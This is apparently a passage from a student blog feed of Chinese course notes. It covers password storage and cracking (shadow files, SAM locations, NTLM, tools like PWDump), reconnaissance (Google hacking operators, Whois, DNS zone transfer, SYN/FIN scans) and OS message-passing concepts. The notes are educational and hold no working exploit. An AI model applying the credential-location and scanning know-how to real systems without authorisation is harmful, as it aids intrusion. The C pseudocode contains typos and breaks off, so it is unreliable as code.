Linux口令存储机制</h2><p>基础口令文件：/etc/password、散列口令文件：/etc/shadow</p><h3 id="Linux-shadow文件">Linux shadow文件</h3><ul><li><p>密码字段有3个部分：使用的算法、salt、密码哈希</p></li><li><p>Salt和密码散列编码为可打印字符</p></li><li><p>多轮哈希函数（减缓暴力攻击）</p><img src="/2024/02/20/3_%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB/3.2.png" class=""></li></ul><p><strong>salt的作用</strong></p><p>使用salt时，相同的输入可能导致不同的散列</p><p>密码散列=单向散列循环（密码| |随机字符串）——随机字符串就是salt</p><p><u>salt可以防止攻击</u>，为什么？</p><blockquote><p>字典攻击：把候选词放入词典；针对目标密码散列尝试每种方法以查找匹配项</p><p>彩虹表攻击：用于反转加密哈希函数的预计算表</p></blockquote><p>1、如果目标密码与预计算数据相同，则哈希值将相同</p><p>2、如果此属性不成立，则所有预计算的数据都将无效</p><p>3、盐破坏了这种特性</p><h2 id="3-2-Windows口令存储机制">3.2 Windows口令存储机制</h2><h3 id="3-2-1-重要位置">3.2.1 重要位置</h3><ul><li><p>%systemroot%system32\config\目录下</p></li><li><p>%SystemRoot%\repair目录下的SAM._文件</p></li><li><p>注册表中HKEY_LOCAL_MACHINE\SAM键</p></li><li><p>Winlogon.exe的内存块中</p></li></ul><h3 id="3-2-2-SAM文件的安全保护措施">3.2.2 SAM文件的安全保护措施</h3><ul><li>Sam文件锁定：在操作系统运行期间，sam文件被system账号锁定，即使用admin权限也无法访问它;</li><li>隐藏：sam在注册表中的备份是被隐藏的;</li><li>不可读：系统保存sam文件时将sam信息经过压缩处理，因此不具有可读性。</li></ul><h2 id="3-3-认证协议——NTLM-NT-Lan-Manager">3.3 认证协议——NTLM(NT Lan Manager)</h2><p>1、将口令转换为Unicode字符串</p><p>2、用MD4对口令进行单向HASH，生成16字节的HASH值，NTLMv2在此基础上增加了双向验证的功能。</p><h2 id="3-4-本地获取方法">3.4 本地获取方法</h2><p>1、获取系统自动保存的口令字（系统将用户的口令保存在硬盘上）</p><p>2、直接读取Windows 系统中的登陆口令（系统将用户的口令暂存在内存中）</p><p>3、破解SAM信息</p><h2 id="3-5-口令破解工具">3.5 口令破解工具</h2><p>破解原理：大多数口令破解工具是通过尝试一个一个的单词，用已知的加密算法来加密这些单词，直到发现一个单词经过加密后的结果和解密的数据一样，就认为这个单词就是要找的密码了。</p><p>L0phtcrack、NTSweep、NTCrack、PWDump</p><h1>4 针对口令传输的攻击</h1><h2 id="4-1-嗅探攻击">4.1 嗅探攻击</h2><p>前提：802.3以太网是一种使用广播信道的网络，在以太网中所有通信都是广播的。</p><p>网卡的侦听模式：广播模式、组播模式、普通模式、混杂模式</p><h2 id="4-2-键盘记录">4.2 键盘记录</h2><ul><li>硬件截获：修改主机的键盘接口。</li><li>软件截获：监视操作系统处理键盘输入的接口，将来自键盘的数据记录下来。</li></ul><h2 id="4-3-网络钓鱼">4.3 网络钓鱼</h2><p>“网络钓鱼（Phishing）”就是攻击者利用欺骗性的电子邮件和伪造的Web站点，骗取用户输入口令以及其他身份敏感信息。</p><h2 id="4-4-重放攻击">4.4 重放攻击</h2><p>指攻击者记录下当前的通讯流量，以后在适当的时候重发给通讯的某一方，达到欺骗的目的。</p><p>具体过程：</p><p>（1）主机A向主机B发出资源访问请求，B返回给A一个挑战值Challenge。</p><p>（2）由于A没有B的合法帐号，因此无法计算响应值Response，此时A暂时将会话挂起，等待机会。</p><p>（3）在某一时刻，B向A发出了资源访问请求，于是A将前面获得的Challenge作为自己的挑战值发送给B。</p><h1>5 口令攻击的防范</h1><h2 id="5-1-选择安全密码">5.1 选择安全密码</h2><ul><li><p>设置足够长度的口令</p></li><li><p>口令中混合使用大小写字母、数字、特殊符号</p></li></ul><h2 id="5-2-防止口令猜测攻击">5.2 防止口令猜测攻击</h2><ul><li>硬盘分区采用NTFS格式</li><li>正确设置和管理帐户</li><li>禁止不需要的服务</li><li>关闭不用的端口</li></ul><h2 id="5-3-设置安全策略">5.3 设置安全策略</h2>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集</title>
    <link href="/2024/02/20/1%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2024/02/20/1%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1>1 信息收集概述</h1><h2 id="1-1-信息收集的内容">1.1 信息收集的内容</h2><ol><li>域名和IP地址</li><li>防火墙、入侵检测等安全防范措施</li><li>内部网络结构、域组织、用户电子邮件</li><li>操作系统类型</li><li>端口</li><li>系统构架</li><li>敏感文件或目录</li><li>应用程序类型</li><li>个人身份信息…</li></ol><h2 id="1-2关于信息搜集的重要观点">1.2关于信息搜集的重要观点</h2><ol><li>信息收集是渗透测试的最重要的一环</li><li>关于攻击目标，知道得越多越好</li><li>知道得越多，就可能知道得更多</li><li>没有无用的信息</li></ol><h2 id="1-2-信息收集分类">1.2 信息收集分类</h2><ol><li><strong>主动</strong>通过直接访问、扫描网站，这种将流量流经网站的行为<ul><li>优点：信息更多</li><li>缺点：目标主机可能会记录操作记录</li></ul></li><li><strong>被动</strong>利用第三方的服务对目标进行访问了解，比例：Google搜索<ul><li>优点：行动不会被目标主机发现</li><li>缺点：信息相对较少</li></ul></li></ol><h1>2 公开信息收集</h1><h2 id="2-1-利用Web服务">2.1 利用Web服务</h2><ol><li><p>网站所有者信息（社会工程学）</p><p>邮编、地址；论坛版本号；网络管理员邮箱；公司人员名单、电话、邮箱</p></li><li><p>得到对应的IP地址</p><p>利用DNS服务器：提供域名到IP地址的映射</p><p>ping <a href="http://www.sina.com.cn">www.sina.com.cn</a></p></li><li><p>获取目标网络拓扑结构</p><p>网络拓扑图、IP分配表、子域名、网络设备、安全设施</p></li></ol><h2 id="2-2-利用搜索引擎服务">2.2 利用搜索引擎服务</h2><p><strong>共同特点：利用公开信息服务收集信息</strong></p><ul><li>信息是公开的</li><li>海量的信息中很多都是敏感的信息</li></ul><h3 id="Google-Hacking">Google Hacking</h3><p><strong>基本操作符</strong></p><table><thead><tr><th>语法</th><th>含义</th></tr></thead><tbody><tr><td>And</td><td>与</td></tr><tr><td>OR</td><td>或</td></tr><tr><td>+</td><td>强制包含搜索项</td></tr><tr><td>-</td><td>非，去掉搜索项</td></tr><tr><td>&quot; &quot;</td><td>包含一个完整的语义</td></tr><tr><td>.</td><td>单个通配符</td></tr><tr><td>*</td><td>任意通配符</td></tr></tbody></table><p><strong>高级操作符</strong></p><table><thead><tr><th>操作符</th><th>含义</th></tr></thead><tbody><tr><td>site:</td><td>搜索具体服务器或域名的网页</td></tr><tr><td>filetype:</td><td>搜索特定类型的文件</td></tr><tr><td>intitle:</td><td>搜索网页标题</td></tr><tr><td>inurl:</td><td>搜索URL</td></tr><tr><td>intext:</td><td>搜索正文</td></tr><tr><td>link:</td><td>搜索连接到指定网页的网页</td></tr></tbody></table><p><strong>Google Hacking可以搜集到的信息</strong></p><p>搜索密码文件、搜索管理员后台URL、搜索web应用漏洞、搜索黑客留下的后门…</p><p><strong>其他工具</strong></p><p>Shodan：在Shodan上搜索出来的可不是单纯的信息，而是所有接入互联网的设备！比如你的电脑、手机、摄像头甚至打印机。</p><p>ZoomEye</p><h2 id="2-3-利用Whols服务">2.3 利用Whols服务</h2><p><strong>功能：查询已注册域名的拥有者信息</strong></p><p>域名登记人信息、联系电话和邮箱、域名注册时间和更新时间、权威DNS的IP地址</p><p><strong>使用方法</strong></p><p><a href="http://www.whois.net">www.whois.net</a>、SamSpade等网络实用工具</p><p><strong>利用网站获得Whois数据</strong></p><p><a href="http://xn--who-ok6ez9gts1e.is">国外的who.is</a>：<a href="https://who.is/">https://who.is/</a></p><p>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><strong>企业的备案信息（中国）</strong></p><p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></p><p>国家企业信用信息公示系统：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a></p><h2 id="2-4-利用DNS服务">2.4 利用DNS服务</h2><ul><li>DNS：提供域名到IP地址的映射</li><li>区域传送（Zone transfer）：允许一个辅域名服务器更新自己的区域数据</li><li>如果DNS配置不当，可能造成内部主机名和IP地址对的泄漏</li></ul><p>使用Nslookup可查到域名服务器地址和IP地址，以及域名服务器的传输内容</p><h2 id="2-5-公开信息搜集方法的应用">2.5 公开信息搜集方法的应用</h2><p>社会工程学：利用受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段。</p><ul><li>从同学录中寻找目标</li><li>在论坛、聊天室设“钓鱼”陷阱</li><li>通过简历收集信息</li><li>利用搜索引擎进行数据挖掘</li><li>网站出售注册信息</li></ul><p><strong>Maltego</strong></p><p>主要功能是开源情报收集和取证。可以自动收集到所需信息，而且可以将收集的信息可视化。</p><h1>3 网络扫描</h1><h2 id="3-1-主机扫描">3.1 主机扫描</h2><h3 id="3-1-1-ICMP">3.1.1 ICMP</h3><ul><li>ICMP协议负责差错的报告与控制。比如目标不可达，路由重定向等等</li></ul><img src="/2024/02/20/1%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.1.jpg" class=""><ul><li>ICMP报文格式<ul><li>类型域(type)用来指明该ICMP报文的类型</li><li>代码域(code)确定该包具体作用</li></ul></li></ul><ul><li><p>常用的ICMP报文</p><table><thead><tr><th>名称</th><th>类型</th></tr></thead><tbody><tr><td>ICMP Destination Unreachable（目标不可达）</td><td>3</td></tr><tr><td>ICMP Source Quench （源抑制）</td><td>4</td></tr><tr><td>ICMP Redirection（重定向）</td><td>5</td></tr><tr><td>ICMP Timestamp Request/Reply（时间戳）</td><td>13/14</td></tr><tr><td>ICMP Address Mask Request/Reply（子网掩码）</td><td>17/18</td></tr><tr><td>ICMP Echo Request/Reply（响应请求/应答）</td><td>8/0</td></tr></tbody></table></li></ul><h3 id="3-1-2-Ping的实现机制">3.1.2 Ping的实现机制</h3><p>向目标主机发送ICMP Echo Request (type 8)数据包，等待回复的ICMP Echo Reply 包(type 0) 。</p><p>:exclamation:根据RFC的定义，TCP/IP协议栈应该支持各种类型的ICMP报文。但事实上，在各个操作系统具体实现TCP/IP时，可能并没有完全遵循RFC标准。</p><h3 id="3-1-3-高级IP扫描技术">3.1.3 高级IP扫描技术</h3><ul><li><p>异常的IP包头</p></li><li><p>在IP头中设置无效的字段值</p><p>向目标主机发送包头错误的IP包，目标主机或过滤设备会反馈ICMP Parameter Problem Error信息。常见的伪造错误字段为Header Length Field 和IP Options Field。</p></li><li><p>错误的数据分片</p><p>向目标主机发送的IP包中填充错误的字段值，目标主机或过滤设备会反馈ICMP Destination Unreachable信息。</p></li></ul><h2 id="3-2-端口扫描">3.2 端口扫描</h2><p>端口是通信的通道（入侵通道）</p><h3 id="3-2-1-基本扫描">3.2.1 基本扫描</h3><p><strong>优点</strong></p><p>实现简单；可以用普通用户权限执行</p><p><strong>缺点</strong></p><p>容易被目标应用日志所记录</p><h3 id="3-2-2-隐秘扫描">3.2.2 隐秘扫描</h3><p><strong>TCP连接建立的过程</strong></p><img src="/2024/02/20/1%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.4.jpg" class=""><p><strong>SYN扫描的优缺点</strong></p><p>优点：一般不会被目标主机的应用所记录</p><p>缺点：运行Raw Socket时必须拥有管理员权限</p><p><strong>FIN扫描的优缺点</strong></p><p>优点：</p><ul><li>不会被记录到日志</li><li>可以绕过某些防火墙</li><li>netstat命令不会显示——netstate命令只能显示TCP连接或连接的尝试</li></ul><p>缺点：</p><ul><li>使用RAW IP编程，实现起来相对比较复杂</li><li>不同操作系统结果不同，因此不完全可信</li></ul><p><strong>扫描工具</strong></p><p>UNIX下的端口扫描工具：Nmap</p><p>Windows下的端口扫描工具：SuperScan、Nmap for windows</p><h2 id="3-3-系统类型扫描">3.3 系统类型扫描</h2><h3 id="3-3-1-应用程序BANNER">3.3.1 应用程序BANNER</h3><p>服务程序接收到客户端的正常连接后所给出的欢迎信息</p><h3 id="3-3-2-TCP-IP协议栈指纹">3.3.2 TCP/IP协议栈指纹</h3><p>不同的操作系统在实现TCP/IP协议栈时都或多或少地存在着差异。而这些差异，我们就称之为TCP/IP协议栈指纹。</p><ul><li>不同的操作系统在实现TCP/IP协议栈的时候，并不是完全按照RFC所定义的标准来实现的</li><li>在RFC中也没有对所有的问题给予精确的定义</li></ul><p><strong>TCP包头中的指纹</strong></p><img src="/2024/02/20/1%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.5.jpg" class=""><p><strong>IP包头中的指纹</strong></p><img src="/2024/02/20/1%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.6.jpg" class=""><h1>4 漏洞扫描</h1><h2 id="4-1-概述">4.1 概述</h2><ul><li><p>在计算机安全领域，安全漏洞（SecurityHole）通常又称作脆弱性（vulnerability）。</p></li><li><p>漏洞的来源:</p><p>（1）硬件、软件或协议设计时的瑕疵</p><p>（2）硬件、软件或协议实现中的弱点</p><p>（3）硬件、软件本身的瑕疵</p><p>（4）系统和网络的错误配置</p></li><li><p>漏洞扫描：指利用一些<u>专门或综合漏洞扫描程序</u>对目标存在的系统漏洞或应用程序漏洞进行扫描。</p></li></ul><h2 id="4-2-漏洞扫描的缺陷">4.2 漏洞扫描的缺陷</h2><p>(1) 报告并不一定可靠；(2) 易暴露目标</p><h2 id="4-3-漏洞检测">4.3 漏洞检测</h2><h3 id="4-3-1-概述">4.3.1 概述</h3><p>漏洞检测就是对重要计算机信息系统进行检查，发现其中可被黑客利用的漏洞。该技术通常采用两种策略，即<strong>被动式策略</strong>和<strong>主动式策略</strong>。</p><ul><li><p>被动式策略</p><p>基于<strong>主机</strong>的检测，对系统中不合适的设置、脆弱的口令以及其他同安全规则相抵触的对象进行检查；</p></li><li><p>主动式策略</p><p>基于<strong>网络</strong>的检测，通过执行一些脚本文件对系统进行攻击，并记录它的反应，从而发现其中的漏洞。</p></li></ul><h3 id="4-3-2-漏洞检测的主要方法">4.3.2 漏洞检测的主要方法</h3><p>直接测试、推断、带凭证的测试</p><h4 id="直接测试">直接测试</h4><p>直接测试是指利用漏洞特点发现系统漏洞的方法</p><p><strong>特点</strong></p><p>1、通常用于对Web服务器漏洞、拒绝服务（DoS）漏洞进行检测。</p><p>2、能够准确地判断系统是否存在特定漏洞。</p><p>3、对于渗透所需步骤较多的漏洞速度较慢。</p><p>4、攻击性较强，可能对存在漏洞的系统造成破坏。</p><p>5、对于DoS漏洞，测试方法会造成系统崩溃。</p><p>6、不是所有漏洞的信息都能通过直接测试方法获得。</p><h4 id="推断">推断</h4><ul><li>推断是指不利用系统漏洞而判断漏洞是否存在的方法。它并不直接渗透漏洞，只是间接地寻找漏洞存在的证据。</li><li>采用推断方法的检测手段主要有版本检查、程序行为分析、操作系统堆栈指纹分析和时序分析等。<ul><li>版本检查是推断方法中最简单的一个应用。</li><li>行为分析在需要推翻某个“风险假设”时非常有用。</li></ul></li></ul><h4 id="带凭证的测试">带凭证的测试</h4><ul><li>凭证是指访问服务所需要的用户名或者密码，包括UNIX的登录权限和从网络调用Windows NT的API的能力。</li><li>除了目标主机IP地址以外，直接测试和推断两种方法都不需要其他任何信息。然而，很多攻击都是拥有UNIX shell访问权限或者NT资源访问权限的用户发起的，他们的目标在于将自己的权限提升成为超级用户，从而可以执行某个命令。对于这样的漏洞，前两种方法很难检查出来。因此如果赋予测试进程目标系统的角色，将能够检查出更多的漏洞。这种方法就是带凭证的测试。</li></ul><h3 id="4-3-3-漏洞扫描软件">4.3.3 漏洞扫描软件</h3><p>ISS、SATAN/SAINT、Nessus</p><p>国内的商业漏洞扫描软件：</p><p>开源软件：Xscan</p><p>国内厂商：绿盟”极光“、启明星辰”天镜“</p><h1>5 网络拓扑探测</h1><h2 id="5-1-拓扑探测">5.1 拓扑探测</h2><ul><li>Traceroute技术：用来发现实际的路由路径</li><li>SNMP<ul><li>不同类型网络设备之间客户机/服务器模式的简单通信协议。</li><li>两个基本命令模式：<ul><li>Read：观察设备配置信息。</li><li>Read/Write：有权写入信息。</li></ul></li></ul></li></ul><h2 id="5-2-网络设备识别">5.2 网络设备识别</h2><ul><li><p>搜索引擎：Sodan、ZoomEye</p></li><li><p>基于设备指纹的设备类型探测</p><p>Banner信息的获取渠道：FTP协议、SSH、Telnet、HTTP</p></li></ul><h2 id="5-3-网络实体IP地理位置定位">5.3 网络实体IP地理位置定位</h2><ul><li>基于查询信息的定位<ul><li>通过查询机构注册的信息确定网络设备的地理位置；</li></ul></li><li>基于网络测量的定位<ul><li>利用探测源与目标实体的时延、拓扑或其他信息估计目标实体的位置。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第五章-互斥和同步（三）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A53/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A53/</url>
    
    <content type="html"><![CDATA[<h1>5.5 消息传递</h1><ul><li><p>进程<strong>交互</strong>时，必须满足两个基本要求∶<strong>同步</strong>和<strong>通信</strong></p><ul><li>同步：实现互斥</li><li>通信：交换信息，实现合作</li></ul><p>=&gt;方法：消息传递</p></li><li><p>消息传递的优点：</p><p>1、提供以上功能</p><p>2、可在<strong>分布式系统</strong>、共享内存的<strong>多处理器系统</strong>、<strong>单处理器系统</strong>中实现</p></li><li><p>消息传递的原语（进程间进行消息传递所需的<strong>最小操作集</strong>）</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">send(destination,message)<br>receive(source,message)<br></code></pre></td></tr></table></figure><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A53/os1.jpg" class=""><h3 id="5-5-1-同步">5.5.1 同步</h3><p>两个进程间的<strong>消息通信</strong>隐含着某种<strong>同步</strong>的信息：只有当一个进程发送消息后，接收者才能接收消息</p><ul><li><p>常见组合</p><ul><li><p>阻塞 send，阻塞 receive</p><ul><li><p>送者和接收者都被阻塞，直到完成信息的投递</p></li><li><p>考虑到了进程间的<strong>紧密同步</strong>，这种情况也称为<strong>会合（rendezvous）</strong></p></li></ul></li><li><p>无阻塞 send，阻塞receive</p><ul><li><p>接收者会被阻塞直到请求的消息到达</p></li><li><p>允许<u>一个进程</u>给<u>各个目标进程</u><strong>尽快</strong>地发送<strong>一条或多条</strong>消息</p></li><li><p>例：一个服务器进程给其他进程提供服务或资源</p></li></ul></li><li><p>无阻塞send，无阻塞receive</p><ul><li>不要求任何一方等待</li></ul></li></ul></li><li><p>无阻塞send存在的问题：</p><ul><li>一个潜在的危险∶错误会导致进程<strong>重复产生消息</strong><ul><li>这些消息可能会<strong>消耗系统资源</strong>，包括<strong>处理器时间</strong>和<strong>缓冲区空间</strong>，进而<strong>损害</strong>其他进程和操作系统</li></ul></li><li>增加了程序员的负担<ul><li>必须确定消息是否收到 =&gt; 进程必须使用<strong>应答消息</strong>，以证实收到了消息</li></ul></li></ul></li><li><p>阻塞receive</p><ul><li>最自然</li><li>存在问题：<ul><li>若消息<strong>丢失</strong>（在分布式系统中很可能发生），或者一个进程在发送预期的消息之前<strong>失败</strong>，则接收进程会<strong>无限期地阻塞</strong>→解决：无阻塞receive</li></ul></li></ul></li><li><p>无阻塞receive</p><ul><li>存在问题<ul><li>若消息在【<u>一个进程</u>(已执行与之匹配的receive)】之后发送，则该消息将被<strong>丢失</strong></li></ul></li><li>解决<ul><li>允许一个进程在(发出receive之前)<strong>检测</strong>是否有消息正在等待</li><li>允许进程在 receive 原语中<strong>确定多个源进程</strong></li></ul></li></ul></li></ul><h3 id="5-5-2-寻址">5.5.2 寻址</h3><ul><li><p>直接寻址（direct addressing）</p><ul><li>send原语包含<strong>目标进程</strong>的<strong>标识</strong></li><li>receive 原语有两种处理方式<ul><li>要求进程<strong>显式</strong>地<strong>指定源进程</strong><ul><li>该进程必须事先知道希望得到来自哪个进程的消息</li><li>适于处理<strong>并发进程间</strong>的<strong>合作</strong></li></ul></li><li>不可能指定所期望的源进程<ul><li>如打印机服务器进程将接受来自各个进程的打印请求→隐式寻址</li><li>此时receive 原语的 source 参数<u>保存接收操作执行后的返回值</u></li></ul></li></ul></li></ul></li><li><p>间接寻址（indirect addressing）</p><ul><li>消息不直接从发送者发送到接收者，而是发送到一个<strong>共享数据结构</strong>，该结构由<u>临时保存消息的队列</u>组成，这些队列通常称为<strong>信箱（mailbox）</strong></li><li>优点：间接寻址通过<strong>解除</strong>发送者和接收者之间的<strong>耦合关系</strong>，可<strong>更灵活</strong>地使用消息</li></ul></li><li><p>发送者和接收者之间的关系</p><ul><li>一对一（one-to-one）<ul><li>允许在两个进程间<strong>建立专用的通信链接</strong>，<strong>隔离</strong>它们间的<strong>交互</strong>，<strong>避免</strong>其他进程的错误<strong>干扰</strong></li></ul></li><li>多对一（many-to-one）<ul><li>对<strong>客户-服务器</strong>间的交互非常有用</li><li>这时信箱常称为一个<strong>端口（port）</strong></li></ul></li><li>一对多 （one-to-many）<ul><li>适用于<strong>一个发送者和多个接收者</strong></li><li>对于<u>在一组进程间</u>广播一条消息或某些信息的应用程序非常有用</li></ul></li><li>多对多（many-to-many）<ul><li>可让多个服务进程对多个客户进程提供服务</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A53/os2.jpg" class=""></li><li><p>进程和信箱的关联：既可以是静态的，也可以是动态的</p><ul><li>静态<ul><li><strong>端口</strong>常常静态地关联到一个特定的进程上。即端口被永久地创建并指定到该进程</li><li><strong>一对一</strong>关系就是典型的<strong>静态</strong>和<strong>永久性关系</strong></li></ul></li><li>动态<ul><li>有很多发送者的情况</li><li>可使用诸如 connect 和 disconnect 之类的原语</li></ul></li></ul></li><li><p>相关问题：信箱的所有权问题</p><ul><li>对于端口<ul><li>信箱的所有都通常是<strong>接收进程</strong>，并由接收进程<strong>创建</strong></li><li>撤销一个进程时，其端口也会随之销毁</li></ul></li><li>对于通用的信箱<ul><li><strong>操作系统</strong>可提供一个<strong>创建信箱</strong>的服务<ul><li>信箱就可视为由创建它的<strong>进程所有</strong>，这时它们也同该进程一起终止</li><li>或视为由<strong>操作系统所有</strong>，这时销毁信箱需要一个<strong>显式命令</strong></li></ul></li></ul></li></ul></li></ul><h3 id="5-5-3-消息格式">5.5.3 消息格式</h3><ul><li>消息头还可能含有一些额外的控制信息，例如创建消息链表的指针域、记录源和目标之间所传递消息的数量、顺序和序号，以及一个优先级域</li></ul><h3 id="5-5-4-排队原则">5.5.4 排队原则</h3><p>1、先进先出</p><p>2、允许指定消息的优先级</p><ul><li>根据消息的<strong>类型</strong>来指定或由<strong>发送者</strong>指定</li></ul><p>3、允许<strong>接收者</strong>检查消息队列并选择下一次接收哪个消息</p><h3 id="5-5-5-互斥">5.5.5 互斥</h3><p>互斥指的是，对一组并发进程，一次只有一个进程能够访问给定的资源或执行给定的功能</p><p>互斥技术可用于解决诸如资源争用之类的冲突，也可以用于进程间的同步，使得它们能够合作</p><ul><li><p>使用消息的互斥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">/ program mutualexelusion */<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> n = <span class="hljs-comment">/* 进程数 */</span><br><span class="hljs-type">void</span> P(<span class="hljs-type">int</span> i)<br>&#123;<br>    message mSg<br>    <span class="hljs-keyword">while</span>:(<span class="hljs-literal">true</span>)&#123;<br>        receive (box,msg);<br>        <span class="hljs-comment">/*临界区 */</span>;<br>        send (box,msg);<br>        <span class="hljs-comment">/* 其余部分*/</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    create <span class="hljs-title function_">mailbox</span><span class="hljs-params">(box)</span>;<br>    send(box,nul1);<br>    parbegin (P(<span class="hljs-number">1</span>),P(<span class="hljs-number">2</span>),...,P(n));<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>一组并发进程共享一个信箱box，初始化为一个<strong>无内容的消息</strong></p></li><li><p>希望进入临界区的进程首先<strong>试图接收一条消息</strong>，若信箱为空， 则<strong>阻塞</strong>该进程</p></li><li><p>一旦进程获得消息，它就<strong>执行其临界区</strong>，然后把该消息<strong>放回信箱</strong></p></li><li><p>消息函数可视为在进程之间传递的一个令牌</p></li><li><p>若有一条消息，则它仅传递给一个进程，而其他进程被阻塞</p><p>消息队列为空，则所有进程被阻塞;一条消息可用时，仅激活一个阻塞进程活，并得到这条消息</p></li></ul></li><li><p>使用消息解决<strong>有界缓冲区</strong><u>生产者/消费者</u>问题的一种方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">Const <span class="hljs-type">int</span> <br>    capacity =<span class="hljs-comment">/*缓冲区容量*/</span>;<br>    null =<span class="hljs-comment">/*空消息 */</span>; <br><span class="hljs-type">int</span> i;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">producer</span><span class="hljs-params">()</span><br>&#123;<br>    message pmsg;<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>    receive(mayproduce,pmsg);<br>    pmsg = produce();<br>    send(mayconsume, pmsg);<br>&#125;<br>    <br><span class="hljs-type">void</span> <span class="hljs-title function_">consumer</span><span class="hljs-params">()</span><br>&#123;<br>    message cmSg;<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        receive(mayconsume,cmsg);<br>        constme(cmsg);<br>        send(mayproauce, null);<br>    &#125;<br>    <br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    create_mailbox (mayproduce);<br>create <span class="hljs-title function_">mailbox</span> <span class="hljs-params">(mayconsume)</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;= capacity;i++) send(mayproduce,null);<br>parbegin(producer,consumer);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1>5.6 读者/写者问题</h1><p>读者/写者问题定义：存在一个多个进程共享的数据区，该数据区可以是<u>一个文件或一块内存空间</u>，甚至可以是<u>一组寄存器</u>；有些进程（reader）<strong>只读取</strong>这个数据区中的数据，有些进程（writer）<strong>只往数据区中写数据</strong></p><p>必须满足的条件∶</p><p>1、任意数量的读进程可同时读这个文件</p><p>2、次只有一个写进程可以写文件</p><p>3、一个写进程正在写文件，则禁止任何读进程读文件</p><p>(读进程不需要排斥其他读进程，而写进程需要排斥其他所有进程，包括读进程和写)</p><p>生产者/消费者问题是否可视为只有一个写进程（生产者）和一个读进程（消费者）的特殊读者/ 写者问题呢?</p><p>答案是不能。生产者不仅仅是一个写进程，它必须<u>读取队列指针</u>，以确定向哪里写下 一项，还必须确定缓冲区是否已满。消费者也不仅仅是一个读进程，它必须<u>调整队列指针</u>以显示它已从缓冲区中移走了一个单元</p><p>读者/写者问题的两种解决方案：1、读者优先；2、写者优先</p><h3 id="5-6-1-读者优先">5.6.1 读者优先</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 